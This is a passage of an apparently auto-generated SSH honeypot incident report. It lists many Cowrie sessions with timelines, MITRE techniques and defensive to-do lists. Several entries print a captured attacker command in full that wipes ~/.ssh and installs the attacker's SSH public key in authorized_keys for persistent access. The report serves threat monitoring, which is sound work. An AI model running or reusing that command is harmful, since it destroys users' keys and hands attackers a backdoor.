- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec7db1bf9671

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 08:47 |
| **Last Seen** | 2026-07-09 08:47 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:47:22` | `cowrie.session.connect` |
| `2026-07-09 08:47:23` | `cowrie.client.version` |
| `2026-07-09 08:47:23` | `cowrie.client.kex` |
| `2026-07-09 08:47:29` | `cowrie.login.success` |
| `2026-07-09 08:47:32` | `cowrie.session.params` |
| `2026-07-09 08:47:32` | `cowrie.command.input` |
| `2026-07-09 08:47:34` | `cowrie.log.closed` |
| `2026-07-09 08:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e947720a4e43

| Field | Detail |
|---|---|
| **Source IP** | `113.28.86[.]1` |
| **First Seen** | 2026-07-09 08:51 |
| **Last Seen** | 2026-07-09 08:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:51:07` | `cowrie.session.connect` |
| `2026-07-09 08:51:08` | `cowrie.client.version` |
| `2026-07-09 08:51:08` | `cowrie.client.kex` |
| `2026-07-09 08:51:10` | `cowrie.login.success` |
| `2026-07-09 08:51:10` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.28.86[.]1` to AbuseIPDB if not already reported
- [ ] Block `113.28.86[.]1` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59b3118724fc

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 08:58 |
| **Last Seen** | 2026-07-09 08:58 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:58:07` | `cowrie.session.connect` |
| `2026-07-09 08:58:08` | `cowrie.client.version` |
| `2026-07-09 08:58:08` | `cowrie.client.kex` |
| `2026-07-09 08:58:15` | `cowrie.login.success` |
| `2026-07-09 08:58:17` | `cowrie.session.params` |
| `2026-07-09 08:58:17` | `cowrie.command.input` |
| `2026-07-09 08:58:19` | `cowrie.log.closed` |
| `2026-07-09 08:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a95725f6688

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 08:58 |
| **Last Seen** | 2026-07-09 08:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:58:51` | `cowrie.session.connect` |
| `2026-07-09 08:58:51` | `cowrie.client.version` |
| `2026-07-09 08:58:51` | `cowrie.client.kex` |
| `2026-07-09 08:58:51` | `cowrie.login.success` |
| `2026-07-09 08:58:52` | `cowrie.session.params` |
| `2026-07-09 08:58:52` | `cowrie.command.input` |
| `2026-07-09 08:58:52` | `cowrie.log.closed` |
| `2026-07-09 08:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b504f2b5fba

| Field | Detail |
|---|---|
| **Source IP** | `167.99.4[.]252` |
| **First Seen** | 2026-07-09 09:00 |
| **Last Seen** | 2026-07-09 09:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:00:41` | `cowrie.session.connect` |
| `2026-07-09 09:00:41` | `cowrie.client.version` |
| `2026-07-09 09:00:41` | `cowrie.client.kex` |
| `2026-07-09 09:00:41` | `cowrie.login.success` |
| `2026-07-09 09:00:41` | `cowrie.session.params` |
| `2026-07-09 09:00:41` | `cowrie.command.input` |
| `2026-07-09 09:00:41` | `cowrie.command.failed` |
| `2026-07-09 09:00:41` | `cowrie.log.closed` |
| `2026-07-09 09:00:42` | `cowrie.session.params` |
| `2026-07-09 09:00:42` | `cowrie.command.input` |
| `2026-07-09 09:00:42` | `cowrie.session.file_download` |
| `2026-07-09 09:00:42` | `cowrie.log.closed` |
| `2026-07-09 09:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.4[.]252` to AbuseIPDB if not already reported
- [ ] Block `167.99.4[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e4813b99fc2

| Field | Detail |
|---|---|
| **Source IP** | `167.99.4[.]252` |
| **First Seen** | 2026-07-09 09:00 |
| **Last Seen** | 2026-07-09 09:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:00:42` | `cowrie.session.connect` |
| `2026-07-09 09:00:42` | `cowrie.client.version` |
| `2026-07-09 09:00:42` | `cowrie.client.kex` |
| `2026-07-09 09:00:42` | `cowrie.login.success` |
| `2026-07-09 09:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.4[.]252` to AbuseIPDB if not already reported
- [ ] Block `167.99.4[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a87e510f8add

| Field | Detail |
|---|---|
| **Source IP** | `167.99.4[.]252` |
| **First Seen** | 2026-07-09 09:00 |
| **Last Seen** | 2026-07-09 09:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:00:42` | `cowrie.session.connect` |
| `2026-07-09 09:00:42` | `cowrie.client.version` |
| `2026-07-09 09:00:42` | `cowrie.client.kex` |
| `2026-07-09 09:00:42` | `cowrie.login.success` |
| `2026-07-09 09:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.4[.]252` to AbuseIPDB if not already reported
- [ ] Block `167.99.4[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f420c8d6cad3

| Field | Detail |
|---|---|
| **Source IP** | `92.62.74[.]41` |
| **First Seen** | 2026-07-09 09:03 |
| **Last Seen** | 2026-07-09 09:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:03:35` | `cowrie.session.connect` |
| `2026-07-09 09:03:36` | `cowrie.client.version` |
| `2026-07-09 09:03:36` | `cowrie.client.kex` |
| `2026-07-09 09:03:37` | `cowrie.login.success` |
| `2026-07-09 09:03:38` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.74[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.62.74[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72416fd04cdc

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-07-09 09:03 |
| **Last Seen** | 2026-07-09 09:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:03:43` | `cowrie.session.connect` |
| `2026-07-09 09:03:44` | `cowrie.client.version` |
| `2026-07-09 09:03:44` | `cowrie.client.kex` |
| `2026-07-09 09:03:47` | `cowrie.login.success` |
| `2026-07-09 09:03:49` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c7884166a6

| Field | Detail |
|---|---|
| **Source IP** | `175.103.54[.]172` |
| **First Seen** | 2026-07-09 09:03 |
| **Last Seen** | 2026-07-09 09:04 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:03:57` | `cowrie.session.connect` |
| `2026-07-09 09:03:57` | `cowrie.client.version` |
| `2026-07-09 09:03:57` | `cowrie.client.kex` |
| `2026-07-09 09:03:58` | `cowrie.login.success` |
| `2026-07-09 09:03:59` | `cowrie.session.params` |
| `2026-07-09 09:03:59` | `cowrie.command.input` |
| `2026-07-09 09:03:59` | `cowrie.command.failed` |
| `2026-07-09 09:04:00` | `cowrie.log.closed` |
| `2026-07-09 09:04:01` | `cowrie.session.params` |
| `2026-07-09 09:04:01` | `cowrie.command.input` |
| `2026-07-09 09:04:01` | `cowrie.session.file_download` |
| `2026-07-09 09:04:01` | `cowrie.log.closed` |
| `2026-07-09 09:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.103.54[.]172` to AbuseIPDB if not already reported
- [ ] Block `175.103.54[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-634f6399ad36

| Field | Detail |
|---|---|
| **Source IP** | `175.103.54[.]172` |
| **First Seen** | 2026-07-09 09:04 |
| **Last Seen** | 2026-07-09 09:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:04:01` | `cowrie.session.connect` |
| `2026-07-09 09:04:01` | `cowrie.client.version` |
| `2026-07-09 09:04:02` | `cowrie.client.kex` |
| `2026-07-09 09:04:03` | `cowrie.login.success` |
| `2026-07-09 09:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.103.54[.]172` to AbuseIPDB if not already reported
- [ ] Block `175.103.54[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7baae5b47356

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]3` |
| **First Seen** | 2026-07-09 09:05 |
| **Last Seen** | 2026-07-09 09:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:05:25` | `cowrie.session.connect` |
| `2026-07-09 09:05:26` | `cowrie.client.version` |
| `2026-07-09 09:05:26` | `cowrie.client.kex` |
| `2026-07-09 09:05:29` | `cowrie.login.success` |
| `2026-07-09 09:05:29` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]3` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-682a2a0818f8

| Field | Detail |
|---|---|
| **Source IP** | `223.210.27[.]53` |
| **First Seen** | 2026-07-09 09:05 |
| **Last Seen** | 2026-07-09 09:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:05:35` | `cowrie.session.connect` |
| `2026-07-09 09:05:36` | `cowrie.client.version` |
| `2026-07-09 09:05:36` | `cowrie.client.kex` |
| `2026-07-09 09:05:39` | `cowrie.login.success` |
| `2026-07-09 09:05:40` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:05:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.210.27[.]53` to AbuseIPDB if not already reported
- [ ] Block `223.210.27[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-236897389c8c

| Field | Detail |
|---|---|
| **Source IP** | `45.154.26[.]147` |
| **First Seen** | 2026-07-09 09:09 |
| **Last Seen** | 2026-07-09 09:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:09:05` | `cowrie.session.connect` |
| `2026-07-09 09:09:05` | `cowrie.client.version` |
| `2026-07-09 09:09:06` | `cowrie.client.kex` |
| `2026-07-09 09:09:07` | `cowrie.login.success` |
| `2026-07-09 09:09:08` | `cowrie.session.params` |
| `2026-07-09 09:09:08` | `cowrie.command.input` |
| `2026-07-09 09:09:08` | `cowrie.command.failed` |
| `2026-07-09 09:09:08` | `cowrie.log.closed` |
| `2026-07-09 09:09:09` | `cowrie.session.params` |
| `2026-07-09 09:09:09` | `cowrie.command.input` |
| `2026-07-09 09:09:10` | `cowrie.session.file_download` |
| `2026-07-09 09:09:10` | `cowrie.log.closed` |
| `2026-07-09 09:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.154.26[.]147` to AbuseIPDB if not already reported
- [ ] Block `45.154.26[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef2483077ae8

| Field | Detail |
|---|---|
| **Source IP** | `45.154.26[.]147` |
| **First Seen** | 2026-07-09 09:09 |
| **Last Seen** | 2026-07-09 09:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:09:10` | `cowrie.session.connect` |
| `2026-07-09 09:09:10` | `cowrie.client.version` |
| `2026-07-09 09:09:10` | `cowrie.client.kex` |
| `2026-07-09 09:09:11` | `cowrie.login.success` |
| `2026-07-09 09:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.154.26[.]147` to AbuseIPDB if not already reported
- [ ] Block `45.154.26[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7108b6e6209

| Field | Detail |
|---|---|
| **Source IP** | `45.154.26[.]147` |
| **First Seen** | 2026-07-09 09:09 |
| **Last Seen** | 2026-07-09 09:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:09:12` | `cowrie.session.connect` |
| `2026-07-09 09:09:12` | `cowrie.client.version` |
| `2026-07-09 09:09:12` | `cowrie.client.kex` |
| `2026-07-09 09:09:13` | `cowrie.login.success` |
| `2026-07-09 09:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.154.26[.]147` to AbuseIPDB if not already reported
- [ ] Block `45.154.26[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e66cdcde6ed

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 09:09 |
| **Last Seen** | 2026-07-09 09:09 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:09:28` | `cowrie.session.connect` |
| `2026-07-09 09:09:31` | `cowrie.client.version` |
| `2026-07-09 09:09:31` | `cowrie.client.kex` |
| `2026-07-09 09:09:35` | `cowrie.login.success` |
| `2026-07-09 09:09:40` | `cowrie.session.params` |
| `2026-07-09 09:09:40` | `cowrie.command.input` |
| `2026-07-09 09:09:41` | `cowrie.log.closed` |
| `2026-07-09 09:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4de2c5b4166d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 09:09 |
| **Last Seen** | 2026-07-09 09:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:09:30` | `cowrie.session.connect` |
| `2026-07-09 09:09:30` | `cowrie.client.version` |
| `2026-07-09 09:09:30` | `cowrie.client.kex` |
| `2026-07-09 09:09:30` | `cowrie.login.success` |
| `2026-07-09 09:09:31` | `cowrie.session.params` |
| `2026-07-09 09:09:31` | `cowrie.command.input` |
| `2026-07-09 09:09:31` | `cowrie.log.closed` |
| `2026-07-09 09:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa0df4d0ddc

| Field | Detail |
|---|---|
| **Source IP** | `203.135.42[.]52` |
| **First Seen** | 2026-07-09 09:10 |
| **Last Seen** | 2026-07-09 09:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:10:45` | `cowrie.session.connect` |
| `2026-07-09 09:10:45` | `cowrie.client.version` |
| `2026-07-09 09:10:46` | `cowrie.client.kex` |
| `2026-07-09 09:10:46` | `cowrie.login.success` |
| `2026-07-09 09:10:47` | `cowrie.session.params` |
| `2026-07-09 09:10:47` | `cowrie.command.input` |
| `2026-07-09 09:10:47` | `cowrie.command.failed` |
| `2026-07-09 09:10:48` | `cowrie.log.closed` |
| `2026-07-09 09:10:49` | `cowrie.session.params` |
| `2026-07-09 09:10:49` | `cowrie.command.input` |
| `2026-07-09 09:10:49` | `cowrie.session.file_download` |
| `2026-07-09 09:10:49` | `cowrie.log.closed` |
| `2026-07-09 09:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.135.42[.]52` to AbuseIPDB if not already reported
- [ ] Block `203.135.42[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a26d37091aa

| Field | Detail |
|---|---|
| **Source IP** | `203.135.42[.]52` |
| **First Seen** | 2026-07-09 09:10 |
| **Last Seen** | 2026-07-09 09:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:10:49` | `cowrie.session.connect` |
| `2026-07-09 09:10:49` | `cowrie.client.version` |
| `2026-07-09 09:10:50` | `cowrie.client.kex` |
| `2026-07-09 09:10:51` | `cowrie.login.success` |
| `2026-07-09 09:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.135.42[.]52` to AbuseIPDB if not already reported
- [ ] Block `203.135.42[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8712f63f08ec

| Field | Detail |
|---|---|
| **Source IP** | `203.135.42[.]52` |
| **First Seen** | 2026-07-09 09:10 |
| **Last Seen** | 2026-07-09 09:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:10:51` | `cowrie.session.connect` |
| `2026-07-09 09:10:51` | `cowrie.client.version` |
| `2026-07-09 09:10:51` | `cowrie.client.kex` |
| `2026-07-09 09:10:52` | `cowrie.login.success` |
| `2026-07-09 09:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.135.42[.]52` to AbuseIPDB if not already reported
- [ ] Block `203.135.42[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd281ed3533

| Field | Detail |
|---|---|
| **Source IP** | `90.228.229[.]182` |
| **First Seen** | 2026-07-09 09:12 |
| **Last Seen** | 2026-07-09 09:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:12:03` | `cowrie.session.connect` |
| `2026-07-09 09:12:04` | `cowrie.client.version` |
| `2026-07-09 09:12:04` | `cowrie.client.kex` |
| `2026-07-09 09:12:05` | `cowrie.login.success` |
| `2026-07-09 09:12:05` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.228.229[.]182` to AbuseIPDB if not already reported
- [ ] Block `90.228.229[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3315c413a267

| Field | Detail |
|---|---|
| **Source IP** | `178.183.125[.]51` |
| **First Seen** | 2026-07-09 09:12 |
| **Last Seen** | 2026-07-09 09:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
